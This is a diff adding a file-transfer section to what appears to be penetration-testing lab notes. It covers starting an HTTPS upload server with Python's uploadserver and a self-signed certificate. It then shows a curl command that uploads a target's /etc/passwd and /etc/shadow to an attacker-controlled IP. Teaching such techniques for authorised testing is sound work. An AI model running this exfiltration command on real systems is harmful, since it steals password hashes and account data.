@@ -71,3 +71,35 @@ surge
 
 > If you want to exploit XSS, SSRF or any vulnerability from another server you'll need to host a CORS file with content "*" this way you'll allow consumption of resources from external entities.
 {: .prompt-tip }
+
+### Web Server Upload
+
+Let's see how we can configure the uploadserver module to use HTTPS for secure communication.
+
+1) Install the uploadserver module.
+```bash
+Shuciran@htb[/htb]$ sudo python3 -m pip install --user uploadserver
+```
+
+2) Create a self-signed certificate.
+```bash
+Shuciran@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+```
+
+> The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.
+{: .prompt-warning }
+
+3) Start Web Server
+```bash
+Shuciran@htb[/htb]$ mkdir https && cd https
+Shuciran@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate /root/server.pem
+
+File upload available at /upload
+Serving HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...
+```
+4) Transfer the file via CURL
+```bash
+Shuciran@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
+```
+> We used the option --insecure because we used a self-signed certificate that we trust.
+{: .prompt-warning }
